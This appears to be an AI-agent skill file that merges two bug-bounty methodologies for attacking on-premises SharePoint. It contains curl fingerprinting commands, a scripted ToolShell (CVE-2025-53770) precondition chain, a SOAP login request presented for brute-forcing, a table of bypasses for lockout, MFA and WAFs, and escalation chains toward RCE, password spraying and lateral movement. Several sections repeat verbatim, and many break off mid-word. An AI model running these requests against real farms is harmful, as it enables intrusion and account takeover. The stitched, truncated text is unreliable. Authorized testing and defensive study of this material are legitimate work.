---
name: bbhunt-sharepoint
description: "Hunt anonymous endpoints, legacy SOAP login bypass and current exploit chains on on-prem SharePoint farms. Unified from 2 upstream skills (cbh, hunting). For authorized security testing only."
agent_created: true
---

# SharePoint Server attack surface — unified methodology

> **Unified skill.** Built from 2 upstream skills across cbh, hunting. Full originals are in `references/upstream-*.md`; the deduplicated union is in `references/unified-method.md`.

## Unified upstream methodology (deduplicated)

### Discovery and hunting method

### Step-by-Step Hunting Methodology

1. **Fingerprint the SharePoint version.** Build number leaks anonymously through several paths. Map the result to the CVE matrix immediately.

   ```bash
   # Method 1: _vti_inf.html (always anonymous, always present)
   curl -sk "https://target.example/_vti_inf.html"
   # → FPVersion="15.00.0.000" (15.x = SP2013, 16.x = SP2016/2019/SE)

   # Method 2: _api/contextinfo POST (anonymous on most farms)
   curl -sk -X POST "https://target.example/_api/contextinfo" \
     -H "Accept: application/json;odata=verbose" \
     | jq -r '.d.GetContextWebInformation.LibraryVersion'
   # → "15.0.5545.1000" (full build number)

   # Method 3: /_layouts/15/start.aspx body
   curl -sk "https://target.example/_layouts/15/start.aspx" \
     | grep -oE "15\.[0-9]+\.[0-9]+\.[0-9]+|16\.[0-9]+\.[0-9]+\.[0-9]+"
   ```

   **Map to CVE matrix:**

   | Build | Edition | Status | Notable unpatched-after-EoL CVEs |
   |---|---|---|---|
   | `15.0.5545.1000` | SP2013 final CU | **EoL 2023-04-11** | CVE-2023-29357, CVE-2023-33160/33157/36941, CVE-2024-21318/30043/38023/38024/38094, CVE-2025-53770/53771, CVE-2025-29794 |
   | `16.0.10416.x` | SP2016 | EoL 2026-07-14 | depends on patch level |
   | `16.0.10417.x+` | SP2019 / SE | active | check Microsoft's monthly Patch Tuesday |

2. **Anonymous-endpoint matrix probe.** Walk every endpoint in the table below in one pass. Anything anonymous becomes part of the attack chain.

   ```
   /_vti_inf.html                                          → version disclosure
   /_layouts/15/start.aspx                                

### A. Discovery checklist — concrete fingerprints, endpoints, headers, CVEs to look for

- **CVE-2025-53770 "ToolShell" four-CVE chain (Unit 42 / MSRC / CISA KEV):**
  - **CVE-2025-49704** — code injection, CVSS **8.8** (authorized attacker).
  - **CVE-2025-49706** — improper authentication / spoofing, CVSS **6.5** (unauthorized); the crafted-`Referer` auth bypass.
  - **CVE-2025-53770** — **deserialization of untrusted data, CVSS 9.8**, unauthorized RCE; a variant of 49706. Added to CISA KEV 2025-07-20 (remediation due 2025-07-21).
  - **CVE-2025-53771** — path traversal / spoofing, CVSS **6.5**; more robust fix than 49706.
  Affects Enterprise Server 2016/2019; 49706 and 53770 also Subscription Edition. **SharePoint Online (M365) is not affected** — cloud tenants are out of scope for this chain.
- **Exact reconnaissance request observed in the wild (Unit 42, CL-CRI-1040):** `GET /_layouts/15/ToolPane.aspx?DisplayMode=Edit&a=/ToolPane.aspx` with `User-Agent: python-requests/2.32.3` and **no Referer header**. Same pattern on the 16hive path for SP2016/2019. Add this to your anonymous-endpoint matrix as the highest-priority probe.
- **Exact exploitation shape:** `POST /_layouts/15/ToolPane.aspx?DisplayMode=Edit&a=/ToolPane.aspx` with **`Referer: /_layouts/SignOut.aspx`** (the 49706-style auth bypass). A 200 that returns a valid FormDigest or a reflection artifact is the precondition signal — do not deliver a malicious ViewState during authorized testing.
- **Web-shell / loot fingerprints:** `spinstall0.aspx` written to `C:\Program Files\Common Files\microsoft shared\Web Ser

### Step-by-Step Hunting Methodology

1. **Fingerprint the SharePoint version.** Build number leaks anonymously through several paths. Map the result to the CVE matrix immediately.

   ```bash
   # Method 1: _vti_inf.html (always anonymous, always present)
   curl -sk "https://target.example/_vti_inf.html"
   # → FPVersion="15.00.0.000" (15.x = SP2013, 16.x = SP2016/2019/SE)

   # Method 2: _api/contextinfo POST (anonymous on most farms)
   curl -sk -X POST "https://target.example/_api/contextinfo" \
     -H "Accept: application/json;odata=verbose" \
     | jq -r '.d.GetContextWebInformation.LibraryVersion'
   # → "15.0.5545.1000" (full build number)

   # Method 3: /_layouts/15/start.aspx body
   curl -sk "https://target.example/_layouts/15/start.aspx" \
     | grep -oE "15\.[0-9]+\.[0-9]+\.[0-9]+|16\.[0-9]+\.[0-9]+\.[0-9]+"
   ```

   **Map to CVE matrix:**

   | Build | Edition | Status | Notable unpatched-after-EoL CVEs |
   |---|---|---|---|
   | `15.0.5545.1000` | SP2013 final CU | **EoL 2023-04-11** | CVE-2023-29357, CVE-2023-33160/33157/36941, CVE-2024-21318/30043/38023/38024/38094, CVE-2025-53770/53771, CVE-2025-29794 |
   | `16.0.10416.x` | SP2016 | EoL 2026-07-14 | depends on patch level |
   | `16.0.10417.x+` | SP2019 / SE | active | check Microsoft's monthly Patch Tuesday |

2. **Anonymous-endpoint matrix probe.** Walk every endpoint in the table below in one pass. Anything anonymous becomes part of the attack chain.

   ```
   /_vti_inf.html                                          → version disclosure
   /_layouts/15/start.aspx                                

### Signals and surfaces

### Crown Jewel Targets

SharePoint Server (on-prem) is one of the richest enterprise attack surfaces in 2025-2026 bug bounty / red-team work. Three forces converge:

1. **End-of-life unpatched code paths.** SharePoint Server 2013 reached extended-support EoL on 2023-04-11 (final build `15.0.5545.1000` / KB5002381). Every SharePoint CVE published after that date is **permanently unpatched** on SP2013 farms. SP2016 reaches EoL 2026-07-14; SP2019 reaches EoL 2026-07-14 (next 2 months as of May 2026); only SP Subscription Edition is currently in active support.
2. **CVE-2025-53770 / 53771 "ToolShell"** — July 2025 emergency-out-of-band patch chain for SPE / SP2019 / SP2016. The vulnerable code path (anonymous `/_layouts/15/ToolPane.aspx?DisplayMode=Edit` + anonymous `__REQUESTDIGEST` + unencrypted ViewState) is present in **SP2013 too** and will never receive a fix.
3. **Custom branded login pages forget legacy SOAP login.** `/_vti_bin/Authentication.asmx` with the `Login` SOAP op is the SharePoint equivalent of WordPress XMLRPC bypass — accepts native Forms credentials anonymously with no rate limit on most farms even when the branded UI has lockout.

**Highest-value SharePoint targets:**

- **SP2013 farms still on the public internet** — every CVE since April 2023 is unpatched. Critical-severity findings.
- **Dealer / partner / supplier portals** built on SharePoint by enterprise integrators (German VW group, a enterprise system integrator, etc.) — high-impact business data, often nested inside corporate AD trees.
- **SharePoint farms with anonymous Forms-auth zones** — Auth

### Attack Surface Signals

**Response-header fingerprints (any one is sufficient — usually multiple co-occur):**
```
SPRequestGuid: <GUID>                           (always — anonymous and authenticated)
X-MS-InvokeApp: 1; RequireReadOnly              (SharePoint web request)
X-SharePointHealthScore: 0                      (SharePoint specific)
SPIisLatency: <ms>                              (SharePoint internal timing)
SPRequestDuration: <ms>                         (SharePoint request duration)
MicrosoftSharePointTeamServices: 15.0.0.0      (often stripped by ELB — but if present, exact version)
X-Forms_Based_Auth_Required: <login URL>        (Forms-auth zone indicator)
X-Forms_Based_Auth_Return_Url: <return URL>     (Forms-auth zone indicator)
X-MSDAVEXT_Error: 917656; Access denied...      (WebDAV extension active)
DAV: 1, 2                                       (WebDAV verbs supported)
Set-Cookie: ASP.NET_SessionId=...               (always — IIS session)
Set-Cookie: FedAuth=...; rtFa=...               (claims-mode auth)
Set-Cookie: WSS_FullScreenMode=...              (SharePoint UI mode)
```

**URL / path fingerprints:**
```
/_layouts/15/                  (SP2013+ layouts root — SP2010 used /_layouts/ without the 15)
/_layouts/14/                  (legacy SP2010 — almost EoL since 2020-10-13)
/_layouts/16/                  (some SP2019 / SPE)
/_vti_bin/                     (FrontPage-RPC + SOAP services)
/_vti_pvt/                     (FrontPage-RPC config — usually 403)
/_vti_inf.html                 (almost always anonymous; contains FPVersion banner)
/_api/       

### Crown Jewel Targets

SharePoint Server (on-prem) is one of the richest enterprise attack surfaces in 2025-2026 bug bounty / red-team work. Three forces converge:

1. **End-of-life unpatched code paths.** SharePoint Server 2013 reached extended-support EoL on 2023-04-11 (final build `15.0.5545.1000` / KB5002381). Every SharePoint CVE published after that date is **permanently unpatched** on SP2013 farms. SP2016 reaches EoL 2026-07-14; SP2019 reaches EoL 2026-07-14 (next 2 months as of May 2026); only SP Subscription Edition is currently in active support.
2. **CVE-2025-53770 / 53771 "ToolShell"** — July 2025 emergency-out-of-band patch chain for SPE / SP2019 / SP2016. The vulnerable code path (anonymous `/_layouts/15/ToolPane.aspx?DisplayMode=Edit` + anonymous `__REQUESTDIGEST` + unencrypted ViewState) is present in **SP2013 too** and will never receive a fix.
3. **Custom branded login pages forget legacy SOAP login.** `/_vti_bin/Authentication.asmx` with the `Login` SOAP op is the SharePoint equivalent of WordPress XMLRPC bypass — accepts native Forms credentials anonymously with no rate limit on most farms even when the branded UI has lockout.

**Highest-value SharePoint targets:**

- **SP2013 farms still on the public internet** — every CVE since April 2023 is unpatched. Critical-severity findings.
- **Dealer / partner / supplier portals** built on SharePoint by enterprise integrators (German VW group, a enterprise system integrator, etc.) — high-impact business data, often nested inside corporate AD trees.
- **SharePoint farms with anonymous Forms-auth zones** — Auth

### Attack Surface Signals

**Response-header fingerprints (any one is sufficient — usually multiple co-occur):**
```
SPRequestGuid: <GUID>                           (always — anonymous and authenticated)
X-MS-InvokeApp: 1; RequireReadOnly              (SharePoint web request)
X-SharePointHealthScore: 0                      (SharePoint specific)
SPIisLatency: <ms>                              (SharePoint internal timing)
SPRequestDuration: <ms>                         (SharePoint request duration)
MicrosoftSharePointTeamServices: 15.0.0.0      (often stripped by ELB — but if present, exact version)
X-Forms_Based_Auth_Required: <login URL>        (Forms-auth zone indicator)
X-Forms_Based_Auth_Return_Url: <return URL>     (Forms-auth zone indicator)
X-MSDAVEXT_Error: 917656; Access denied...      (WebDAV extension active)
DAV: 1, 2                                       (WebDAV verbs supported)
Set-Cookie: ASP.NET_SessionId=...               (always — IIS session)
Set-Cookie: FedAuth=...; rtFa=...               (claims-mode auth)
Set-Cookie: WSS_FullScreenMode=...              (SharePoint UI mode)
```

**URL / path fingerprints:**
```
/_layouts/15/                  (SP2013+ layouts root — SP2010 used /_layouts/ without the 15)
/_layouts/14/                  (legacy SP2010 — almost EoL since 2020-10-13)
/_layouts/16/                  (some SP2019 / SPE)
/_vti_bin/                     (FrontPage-RPC + SOAP services)
/_vti_pvt/                     (FrontPage-RPC config — usually 403)
/_vti_inf.html                 (almost always anonymous; contains FPVersion banner)
/_api/       

### Techniques, payloads and bypasses

### Common Root Causes

1. **`/_vti_bin/Authentication.asmx` left enabled on the public-zone IIS binding.** SharePoint admins enable Forms auth on a custom login UI and don't realise the legacy SOAP Login endpoint is independently reachable.

2. **`viewStateEncryption="Auto"` on layouts pages.** SharePoint's default ViewState mode signs-only for pages without sensitive form fields. Pages like ToolPane.aspx have `__VIEWSTATEENCRYPTED=""` — exploitable if machineKey leaks.

3. **`/_api/contextinfo` POST accessible anonymously.** SharePoint Online and SPE 2024-07+ require auth on contextinfo. Earlier versions and most SP2013 farms allow anonymous POST → FormDigest token returned with 1800s validity. This is the second ToolShell precondition.

4. **NTLM enabled on public-zone IIS binding.** Default dual-auth (Forms + NTLM) leaves NTLM Negotiate available to anonymous internet users. Type-2 challenge leaks AD topology.

5. **SP2013 farms past EoL still internet-exposed.** Microsoft extended support ended 2023-04-11. Every post-April-2023 SharePoint CVE is unpatched. Common in enterprise integrator scenarios (system-integrator inside corporate-parent AD, SI-managed dealer portals).

6. **`<SafeControl>` whitelist in web.config trusted as the only gate.** Picker.aspx enforces an `instanceof PickerDialog` check, which is patched against the original CVE-2019-0604 vector — but the underlying SafeControl model itself is anonymously enumerable via the Picker.aspx error differential.

7. **AWS ELB + SP IIS without explicit Transfer-Encoding normalization.** Default ELB forwards `Transf

### B. Techniques & bypasses — specific actionable techniques/payload shapes

- **Precondition chain (safe, sufficient for a report):** (a) anonymous `GET /_layouts/15/ToolPane.aspx?DisplayMode=Edit` → body has `__REQUESTDIGEST="0x..."` AND `__VIEWSTATEENCRYPTED=""`; (b) anonymous `POST /_api/contextinfo` with `Accept: application/json;odata=verbose` → valid `FormDigestValue` (~1800s); (c) `POST` back to ToolPane.aspx with `X-RequestDigest: <digest>` and no auth → 200. Add the observed `?a=/ToolPane.aspx` query and the SignOut `Referer` variant to prove the auth-bypass arm.
- **Version → CVE mapping before claiming RCE:** fingerprint via `/_vti_inf.html` (`FPVersion="15.00.0.000"`), `_api/contextinfo` `LibraryVersion`, and `/_layouts/15/start.aspx`. Map the build number to whether 53770's patch is present; on EoL SP2013 it never will be.
- **MachineKey is the pivot, not the gate.** After the initial web shell, the attacker dumps ValidationKey/DecryptionKey from `web.config`/`machine.config` and then forges signed ViewState for unauthenticated re-entry. In a report, explain this explicitly: a farm with unknown machine keys can still be fully exploitable, and a *patched* farm whose keys were stolen before patching remains compromised until `Update-SPMachineKey` (or Central Admin key rotation) plus an IIS restart.
- **Request-smuggling companion:** the baseline research on AWS ELB + IIS TE/CL desync is still valid and independently Critical (5/5 trials with ~12s back-end hang). Test CL.TE / TE.CL with `Transfer-Encoding` obfuscations (space-before-colon, trailing space, lowerc

### Payload & Detection Patterns

**Authentication.asmx Login (the canonical brute-force endpoint):**
```xml
POST /_vti_bin/Authentication.asmx HTTP/1.1
Host: target.example
Content-Type: text/xml; charset=utf-8
SOAPAction: http://schemas.microsoft.com/sharepoint/soap/Login
Content-Length: 376

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <Login xmlns="http://schemas.microsoft.com/sharepoint/soap/">
      <username>USERNAME</username>
      <password>PASSWORD</password>
    </Login>
  </soap:Body>
</soap:Envelope>
```
Response codes:
- `<ErrorCode>NoError</ErrorCode>` → auth success; `<CookieName>FedAuth</CookieName>` and `<TimeoutSeconds>...</TimeoutSeconds>` follow
- `<ErrorCode>PasswordNotMatch</ErrorCode>` → auth fail (uniform for non-existent users too — no enum leak via error string)
- 500 + `<faultstring>Value cannot be null. Parameter name: userName</faultstring>` → empty username

**ToolShell precondition reproduction:**
```bash
# Step 1: anon GET ToolPane.aspx
TP=$(curl -sk "https://target.example/_layouts/15/ToolPane.aspx?DisplayMode=Edit")
echo "$TP" | grep -oE '__VIEWSTATEENCRYPTED" id="__VIEWSTATEENCRYPTED" value="[^"]*"'
# If value="" → precondition

# Step 2: anon FormDigest
DIGEST=$(curl -sk -X POST "https://target.example/_api/contextinfo" \
  -H "Accept: application/json;odata=verbose" \
  | jq -r '.d.GetContextWebInformation.FormDigestValue')
echo "Digest: ${DIGEST:0:40}..."

# Step 3: anon POST ToolPane with digest
curl -sk -X POST -H "X-RequestDigest: $DIGEST" \
  --data

### Bypass Techniques

| Defense | Bypass / Recon Strategy |
|---|---|
| Branded `customlogin.aspx` with lockout / CAPTCHA / MFA | `/_vti_bin/Authentication.asmx` legacy SOAP — none of those protections apply |
| `WWW-Authenticate: NTLM` requires authenticated callers | Default IIS `extendedProtection=None` lets you elicit the Type-2 challenge anonymously — see `hunt-ntlm-info` |
| `MicrosoftSharePointTeamServices` header stripped at ELB | Body of `/_layouts/15/start.aspx` leaks version anyway; also `/_api/contextinfo`'s `LibraryVersion` |
| `/_vti_bin/lists.asmx` 403 (SharedAccess.asmx / Authentication.asmx still open) | Different services have different ACLs; enumerate all asmx separately |
| `/_api/web/CurrentUser` 401 with stack-trace JSON | Stack traces leak even on auth-deny responses; combine with version disclosure |
| Anonymous `__REQUESTDIGEST` issued (ToolShell precondition) | Pair with anonymous ToolPane POST + unencrypted ViewState; the deserialization sink yields RCE without machineKey — machineKey is then dumped by the shell for persistent re-exploitation |
| Custom error pages set | Trigger different code paths (XML-shaped ViewState → dual-parser error differential — see `hunt-aspnet`) |
| WAF blocks `<` in query | Move payload to Cookie / Referer / SOAP body — request validator doesn't reach those contexts |
| `Microsoft.SharePoint.WebPartPages.DataFormWebPart` blocked via SafeControl patch | Enumerate SafeControl list; find a subclass that bypasses the inheritance gate |
| HTTP/2 H2.CL smuggling | AWS ALBs often don't advertise `h2` ALPN — close that famil

### Validation and proof

### Gate 0 Validation

Before writing the report:

1. **What can the attacker DO right now?**
   - Authentication.asmx anonymous + no rate limit → **Critical** (unbounded credential validation; password spray + UPN format from NTLM = end-to-end ATO path)
   - Full ToolShell precondition chain (anon GET + anon FormDigest + anon POST + unencrypted VS) + EoL SP2013 → **Critical** (RCE via well-documented public exploit chain, no patch will ship)
   - NTLM Type-2 AD topology disclosure + default-Windows hostname → **Medium**
   - SP2013 EoL alone → **Medium-Low** (compliance / hygiene; bug-bounty programs vary — some accept, many reject)
   - `download.aspx` URL echo without confirmed Collaborator callback → **NOT SSRF — retract**

2. **Have you reproduced the full chain to attacker-attainable impact?**
   - For Authentication.asmx: 10-burst test with uniform timing (proves no rate limit) is sufficient. Don't actually crack a credential.
   - For ToolShell: precondition chain (steps a+b+c) is sufficient. Don't deliver a malicious payload.
   - For NTLM: AV-pair decode showing AD-topology fields is sufficient.

3. **Can you reproduce in <10 minutes from a clean shell?**
   - Authentication.asmx: 2 curl commands.
   - ToolShell precondition: 3 curl commands.
   - NTLM Type-2: 1 Python snippet (the AV-pair decoder).

---

### C. Validation / proof bar — how to confirm and avoid false positives

- **Preconditions ≠ RCE.** A clean ToolShell precondition chain is sufficient for a Critical finding on EoL SP2013 (the exploit is public and no patch will ship), but label it accurately: "unauthenticated RCE chain preconditions met," not "I achieved code execution." Delivering an actual malicious ViewState is out of scope for authorized precondition testing.
- **Do not mistake `download.aspx?SourceUrl=` for SSRF.** It is an SP-internal `SPWebApplication`/`SPFile` resolver; external URLs produce `"The Web application at <URL> could not be found"` and the URL echo in the error is just formatting. A negative OOB test (38 Collaborator-tagged payloads across 12+ parameters → zero callbacks in the original engagement) is the correct conclusion. The extension-blocklist response is also not a file-existence oracle.
- **File-extension blocklist caution:** `.ashx/.asmx/.svc/.config` return "file blocked from this Web site by the server administrators" regardless of existence — do not infer file presence from that message.
- **ViewState MAC-failure ambiguity:** a 500 with `"Validation of viewstate MAC failed... Web Farm or cluster..."` confirms multi-WFE topology without synced machineKey (or no sticky sessions), which is an operational/hygiene finding — not by itself the deserialization RCE.
- **Severity matrix:** anonymous Authentication.asmx + no rate limit = Critical; full ToolShell preconditions + EoL SP2013 = Critical; request smuggling with a demonstrated time delay = Critical; NTLM Type-2 AD topology + 

### Escalation and related chains

### Related Skills & Chains

- **`auth-bypass`** — Legacy SOAP `/_vti_bin/Authentication.asmx` accepts anonymous Login calls on misconfigured farms. Chain primitive: SharePoint anon SOAP login probe → if response yields cookie or success differential → `auth-bypass` brute-force matrix (username enumeration via timing, password spray with low-and-slow against the same SOAP endpoint that bypasses ADFS-level lockout) → valid cred → `/_layouts/15/` authenticated surface.
- **`ntlm-info`** — Every SharePoint farm advertises `WWW-Authenticate: NTLM` anonymously on `/_vti_bin/`. Chain primitive: SharePoint NTLM Type-2 challenge capture → `ntlm-info` AV_PAIR decode yields NetBIOS domain + internal DNS forest + DC hostname → feed domain into `m365-entra-attack` ROPC user-enumeration spray on tenant tied to that domain.
- **`aspnet`** — SharePoint is ASP.NET Webforms under the covers; ViewState, machineKey, and SafeControl reflection all apply. Chain primitive: SharePoint version disclosure → confirm patch level missing → `aspnet` ViewState dual-parser MAC-bypass → deserialization gadget → RCE in `w3wp.exe` as farm account.
- **`rce`** — ToolShell precondition chain (CVE-2025-53770) is the current high-impact SP RCE path. Chain primitive: ToolShell preconditions met (`/_layouts/15/ToolPane.aspx?DisplayMode=Edit` reachable via the CVE-2025-49706 auth bypass — a crafted `Referer` header pointing at ToolPane.aspx — + version vulnerable) → `rce` deserialization gadget chain → SYSTEM/farm-account shell → `m365-entra-attack` lateral via stolen on-prem service-account token to Entra-synced 

### Related Skills & Chains

- **`hunt-auth-bypass`** — Legacy SOAP `/_vti_bin/Authentication.asmx` accepts anonymous Login calls on misconfigured farms. Chain primitive: SharePoint anon SOAP login probe → if response yields cookie or success differential → `hunt-auth-bypass` brute-force matrix (username enumeration via timing, password spray with low-and-slow against the same SOAP endpoint that bypasses ADFS-level lockout) → valid cred → `/_layouts/15/` authenticated surface.
- **`hunt-ntlm-info`** — Every SharePoint farm advertises `WWW-Authenticate: NTLM` anonymously on `/_vti_bin/`. Chain primitive: SharePoint NTLM Type-2 challenge capture → `hunt-ntlm-info` AV_PAIR decode yields NetBIOS domain + internal DNS forest + DC hostname → feed domain into `m365-entra-attack` ROPC user-enumeration spray on tenant tied to that domain.
- **`hunt-aspnet`** — SharePoint is ASP.NET Webforms under the covers; ViewState, machineKey, and SafeControl reflection all apply. Chain primitive: SharePoint version disclosure → confirm patch level missing → `hunt-aspnet` ViewState dual-parser MAC-bypass → deserialization gadget → RCE in `w3wp.exe` as farm account.
- **`hunt-rce`** — ToolShell precondition chain (CVE-2025-53770) is the current high-impact SP RCE path. Chain primitive: ToolShell preconditions met (`/_layouts/15/ToolPane.aspx?DisplayMode=Edit` reachable via the CVE-2025-49706 auth bypass — a crafted `Referer` header pointing at ToolPane.aspx — + version vulnerable) → `hunt-rce` deserialization gadget chain → SYSTEM/farm-account shell → `m365-entra-attack` lateral via stolen on-pre

## Source skills merged into this topic

- `hunting` — `sharepoint`
- `cbh` — `hunt-sharepoint`

## References

- `references/unified-method.md` — complete deduplicated union of all upstream sections
- `references/upstream-*.md` — full original SKILL.md from each contributing repo
- `references/upstream-assets/` — 2 companion files (payload/technique references, scripts, validators and schemas) from the contributing skills
- `../../upstream/` — complete unmodified archives of all five source repositories
- `bbhunt-methodology` — orchestrator, state machine and class router
